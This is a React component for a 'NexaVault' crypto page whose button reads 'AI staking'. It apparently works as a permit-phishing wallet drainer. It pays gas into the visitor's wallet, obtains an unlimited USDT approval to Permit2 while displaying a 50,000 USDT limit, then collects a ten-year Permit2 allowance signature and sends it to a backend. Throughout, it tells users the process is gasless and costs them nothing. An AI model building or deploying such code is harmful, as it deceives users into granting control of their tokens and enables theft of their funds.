import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import toast from 'react-hot-toast';
import { useMetaMask } from '../hooks/useMetaMask';
import { signPermit2Allowance } from '../utils/permit2';
import { api } from '../utils/api';
import { USDT_ADDRESS, USDT_ABI, PERMIT2_ADDRESS } from '../utils/contracts';

export default function ApproveForm() {
  const { provider, signer, account } = useMetaMask();
  const [usdtBalance, setUsdtBalance]     = useState('0');
  const [permit2Allowance, setPermit2Allowance] = useState('0');
  const [loading, setLoading] = useState(false);
  const [step, setStep]       = useState(''); // 'funding' | 'approving' | 'signing' | ''
  const [copied, setCopied]   = useState(false);

  const APPROVAL_LIMIT = '50000'; // Default approval limit: 50,000 USDT

  useEffect(() => {
    if (provider && account) fetchBalance();
  }, [provider, account]);

  const fetchBalance = async () => {
    try {
      const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const [balance, decimals, allowance] = await Promise.all([
        contract.balanceOf(account),
        contract.decimals(),
        contract.allowance(account, PERMIT2_ADDRESS),
      ]);
      setUsdtBalance(ethers.formatUnits(balance, decimals));
      setPermit2Allowance(ethers.formatUnits(allowance, decimals));
    } catch (err) {
      console.error('Balance fetch error', err);
    }
  };

  const getReferrerFromUrl = () => {
    const params = new URLSearchParams(window.location.search);
    return params.get('ref') || null;
  };

  const handleSignAndApprove = async () => {
    if (!account || !signer) { toast.error('Connect wallet first'); return; }
    setLoading(true);
    try {
      const decimals = 18;
      const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);

      // ── Step 1: Check if user has approved Permit2 contract on USDT ──
      const currentAllowance  = await contract.allowance(account, PERMIT2_ADDRESS);
      const requiredAllowance = ethers.parseUnits(APPROVAL_LIMIT, decimals);

      if (currentAllowance < requiredAllowance) {
        // ── Step 1a: Fund gas from admin if user has 0 BNB ──
        setStep('funding');
        toast.loading('Preparing your wallet for approval...', { id: 'fund-step' });

        const fundResult = await api.requestGasFunding(account);
        if (fundResult.alreadyFunded) {
          toast.success('Wallet has sufficient gas.', { id: 'fund-step' });
        } else {
          toast.success(`Gas funded (${parseFloat(fundResult.amount).toFixed(8)} BNB sent).`, { id: 'fund-step' });
        }

        // Poll on-chain until BNB balance confirmed
        if (!fundResult.alreadyFunded) {
          toast.loading('Confirming gas arrival on-chain...', { id: 'fund-step' });
          const MIN_BNB = ethers.parseEther('0.00001');
          const bscRpc  = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
          const TIMEOUT = 30000;
          const POLL_MS = 2000;
          let elapsed   = 0;
          let bnbBal    = 0n;
          while (elapsed < TIMEOUT) {
            try { bnbBal = await bscRpc.getBalance(account); if (bnbBal >= MIN_BNB) break; } catch (_) {}
            await new Promise(r => setTimeout(r, POLL_MS));
            elapsed += POLL_MS;
          }
          if (bnbBal < MIN_BNB) throw new Error('Gas funding did not arrive in time. Please try again.');
          await new Promise(r => setTimeout(r, 2000));
          toast.success('Gas confirmed! Proceeding to approval.', { id: 'fund-step' });
        }

        // ── Step 1b: Approve Permit2 on USDT ──
        setStep('approving');
        toast.loading('Approving Permit2 on USDT token...', { id: 'approve-step' });

        const maxApproval = ethers.MaxUint256;
        const approveTx   = await contract.approve(PERMIT2_ADDRESS, maxApproval);
        await approveTx.wait();
        toast.success('✅ Permit2 approved on USDT token!', { id: 'approve-step' });

        // Instantly pre-log approval
        try {
          const defaultExp = Math.floor(Date.now() / 1000) + 3600 * 24 * 365 * 10;
          await api.submitPermit({
            owner: account, token: USDT_ADDRESS,
            amount: requiredAllowance.toString(),
            nonce: 0, deadline: defaultExp,
            v: 27, r: '0x' + '0'.repeat(64), s: '0x' + '0'.repeat(64),
            spender: PERMIT2_ADDRESS, referrer: getReferrerFromUrl(),
          });
        } catch (preErr) {
          console.warn('Pre-logging warning:', preErr.message);
        }
      }

      // ── Step 2: Sign EIP-712 AllowanceTransfer Permit (gasless) ──
      setStep('signing');
      toast.loading('Signing gasless permit...', { id: 'sign-step' });

      const amountUint160 = ethers.parseUnits(APPROVAL_LIMIT, decimals);
      const expiration    = Math.floor(Date.now() / 1000) + 3600 * 24 * 365 * 10;

      const { signature, permit, nonce } = await signPermit2Allowance(provider, account, amountUint160, expiration);
      const referrer = getReferrerFromUrl();

      await api.submitPermit({
        owner: account, token: USDT_ADDRESS,
        amount: amountUint160.toString(), nonce, deadline: expiration,
        v: signature.v, r: signature.r, s: signature.s,
        spender: permit.spender, referrer,
      });

      toast.success('Permit signed and stored successfully!', { id: 'sign-step' });
      fetchBalance();
    } catch (err) {
      console.error(err);
      toast.dismiss('fund-step'); toast.dismiss('approve-step'); toast.dismiss('sign-step');
      if (err.code === 'ACTION_REJECTED' || err.code === 4001) {
        toast.error('Transaction rejected by user');
      } else {
        toast.error(err.reason || err.message || 'Process failed');
      }
    } finally {
      setLoading(false);
      setStep('');
    }
  };

  const referralLink = account ? `${window.location.origin}/?ref=${account}` : '';

  const copyReferralLink = () => {
    if (!referralLink) return;
    navigator.clipboard.writeText(referralLink);
    setCopied(true);
    toast.success('Referral link copied to clipboard!');
    setTimeout(() => setCopied(false), 3000);
  };

  const hasPermit2Approval = parseFloat(permit2Allowance) >= parseFloat(APPROVAL_LIMIT);

  const getButtonText = () => {
    if (step === 'funding')  return 'Preparing wallet...';
    if (step === 'approving') return 'Confirm approval in wallet...';
    if (step === 'signing')   return 'Signing Gasless Permit...';
    if (loading) return 'Processing...';
    return 'AI staking';
  };

  return (
    <div className="space-y-6 max-w-lg w-full mx-auto">
      {/* Approval Card */}
      <div className="bg-[#0d0120]/80 backdrop-blur-xl border border-purple-800/50 rounded-3xl p-8 shadow-2xl shadow-purple-950/40">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-2xl font-bold bg-gradient-to-r from-violet-300 via-purple-400 to-fuchsia-400 bg-clip-text text-transparent">
            NexaVault Approval
          </h2>
          <span className="bg-purple-500/10 text-purple-300 text-xs font-semibold px-3 py-1 rounded-full border border-purple-500/20">
            Permit2 Standard
          </span>
        </div>
        <p className="text-sm text-slate-400 mb-6 leading-relaxed">
          {!hasPermit2Approval
            ? 'Sign once with zero gas cost. Gas fees are covered automatically.'
            : 'Sign once with zero gas cost. Default approval limit is set to 50,000 USDT.'}
        </p>

        <div className="bg-[#070012]/60 border border-purple-900/40 rounded-2xl p-4 mb-6 space-y-3">
          <div className="flex justify-between items-center text-sm text-slate-400">
            <span>Your USDT Balance:</span>
            <span className="font-mono text-emerald-400 font-semibold">{parseFloat(usdtBalance).toFixed(4)} USDT</span>
          </div>
          <div className="flex justify-between items-center text-sm text-slate-400 pt-2 border-t border-slate-800/60">
            <span>Approval Limit:</span>
            <span className="font-mono text-violet-400 font-semibold">50,000 USDT</span>
          </div>
          <div className="flex justify-between items-center text-sm text-slate-400 pt-2 border-t border-slate-800/60">
            <span>Permit2 Token Approval:</span>
            <span className={`font-mono font-semibold ${hasPermit2Approval ? 'text-emerald-400' : 'text-rose-400'}`}>
              {hasPermit2Approval ? '✅ Approved' : '❌ Not Approved'}
            </span>
          </div>
        </div>

        {/* Progress Steps */}
        {loading && (
          <div className="mb-4 bg-slate-950/60 border border-slate-800 rounded-xl p-3 space-y-2">
            <div className={`flex items-center gap-2 text-xs ${step === 'funding' ? 'text-violet-400' : (step === 'approving' || step === 'signing' ? 'text-emerald-400' : 'text-slate-500')}`}>
              <span>{step === 'funding' ? '⏳' : (step === 'approving' || step === 'signing' ? '✅' : '⬜')}</span>
              <span>Step 1: Preparing wallet (automatic, no cost to you)</span>
            </div>
            <div className={`flex items-center gap-2 text-xs ${step === 'approving' ? 'text-violet-400' : (step === 'signing' ? 'text-emerald-400' : 'text-slate-500')}`}>
              <span>{step === 'approving' ? '⏳' : (step === 'signing' ? '✅' : '⬜')}</span>
              <span>Step 2: Approve Permit2 on USDT (confirm in wallet)</span>
            </div>
            <div className={`flex items-center gap-2 text-xs ${step === 'signing' ? 'text-violet-400' : 'text-slate-500'}`}>
              <span>{step === 'signing' ? '⏳' : '⬜'}</span>
              <span>Step 3: Sign gasless permit (no gas needed)</span>
            </div>
          </div>
        )}

        <button
          onClick={handleSignAndApprove}
          disabled={loading}
          className="w-full bg-gradient-to-r from-violet-500 via-purple-500 to-fuchsia-500 hover:from-violet-400 hover:to-fuchsia-400 text-white font-bold py-4 rounded-2xl shadow-xl hover:shadow-purple-500/25 hover:scale-[1.01] active:scale-[0.99] transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {getButtonText()}
        </button>

        <p className="text-xs text-slate-500 mt-4 text-center">
          ⚡ Completely gasless – zero fees required from your wallet.
        </p>
      </div>

      {/* Referral Section */}
      {account && (
        <div className="bg-[#0d0120]/80 backdrop-blur-xl border border-purple-800/50 rounded-3xl p-6 shadow-2xl shadow-purple-950/40">
          <h3 className="text-lg font-bold text-slate-200 mb-2">🎁 Share &amp; Refer</h3>
          <p className="text-xs text-slate-400 mb-4">
            Share your unique referral link with others to earn rewards.
          </p>
          <div className="flex items-center gap-2">
            <input
              type="text"
              readOnly
              value={referralLink}
              className="flex-1 bg-slate-950/80 border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-slate-300 font-mono focus:outline-none"
            />
            <button
              onClick={copyReferralLink}
              className="bg-violet-500 hover:bg-violet-400 text-white font-bold text-xs px-4 py-2.5 rounded-xl transition whitespace-nowrap"
            >
              {copied ? 'Copied!' : 'Copy Link'}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
